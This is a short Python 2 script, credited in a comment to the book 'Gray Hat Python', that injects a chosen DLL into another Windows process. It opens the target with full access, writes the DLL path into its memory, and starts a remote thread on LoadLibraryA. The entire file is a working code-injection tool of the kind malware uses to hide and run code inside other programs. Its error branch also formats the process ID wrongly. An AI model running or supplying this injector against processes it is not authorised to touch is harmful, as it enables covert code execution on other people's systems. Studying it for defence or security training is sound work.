import sys
from ctypes import *

# Shamelessly stolen from Gray Hat Python

PAGE_READWRITE 		= 0x04
PROCESS_ALL_ACCESS 	= (0x000F0000  | 0x00100000 | 0xFFF)
VIRTUAL_MEM 		= (0x1000 | 0x2000)

kernel32	= windll.kernel32
pid			= sys.argv[1]
dll_path	= sys.argv[2]

dll_len 	= len(dll_path)

h_process 	= kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
	print "[*] CANNOT OPEN PROCESS WITH PID: %d" % pid
	sys.exit(1)

arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

written 	= c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
print "[*] Written %d bytes into process %d" % (written.value, int(pid))

h_kernel32 	= kernel32.GetModuleHandleA('kernel32.dll')
print "[*] Located kernel32.dll in host process at 0x%08x" % h_kernel32

h_loadlib	= kernel32.GetProcAddress(h_kernel32, 'LoadLibraryA')
print "[*] Located LoadLibraryA in host process at 0x%08x" % h_loadlib


thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, 
									None, 
									0,
									h_loadlib, 
									arg_address, 
									0,
									byref(thread_id)):
	print "[*] FAILED TO INJECT DLL. EXITING."
	sys.exit(1)

print "[*] Remote thread with ID 0x%08x created." % thread_id.value
sys.exit(0)